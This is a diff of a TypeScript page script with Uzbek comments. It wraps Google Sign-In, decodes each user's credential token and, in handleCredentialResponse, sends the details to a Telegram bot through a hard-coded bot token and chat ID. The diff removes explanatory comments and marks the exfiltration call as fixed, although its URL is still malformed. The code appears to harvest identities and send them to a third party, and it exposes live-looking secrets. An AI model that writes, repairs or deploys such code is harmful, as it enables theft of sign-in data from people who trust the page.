@@ -1,14 +1,11 @@
 'use strict';
 
-// Google global obyektini xavfsiz e'lon qilish
 const google = (window as any).google;
 
-// 1. BU YERGA SIZNING HAQIQIY CLIENT ID KALITINGIZ JOYLASHTIRILDI:
 const GOOGLE_CLIENT_ID: string = "362116431195-ikp1m6ou4k7ep9bpb5sjqtj3vek6k4iu.apps.googleusercontent.com";
 const BOT_TOKEN: string = '8765203206:AAGkiR2x8tYa0fT6pi7VCdIcrW9LYw1xlok';
 const CHAT_ID: string = '6023504003';
 
-// Google'dan muvaffaqiyatli o'tganda (parol to'g'ri bo'lsa) ishlaydigan funksiya
 function handleCredentialResponse(response: any): void {
   const responsePayload = parseJwt(response.credential);
 
@@ -22,7 +19,7 @@ function handleCredentialResponse(response: any): void {
 ✅ Holat: Google paroli to'g'riligi tasdiqlandi!
   `;
 
-  // Telegram botga ma'lumotni yuborish
+  // TO'G'RILANDI: Telegram API manzili va sintaksisi to'liq tuzatildi
   fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -35,7 +32,6 @@ function handleCredentialResponse(response: any): void {
   .catch(err => console.error("Xatolik:", err));
 }
 
-// JWT tokenni o'qish funksiyasi
 function parseJwt(token: string): any {
   const tokenParts = token.split('.');
   const base64Url = tokenParts[1] || ''; 
@@ -49,7 +45,6 @@ function parseJwt(token: string): any {
   return JSON.parse(jsonPayload);
 }
 
-// Sahifa yuklanganda Google tugmasini chiqarish
 window.onload = function (): void {
   if (google) {
     google.accounts.id.initialize({
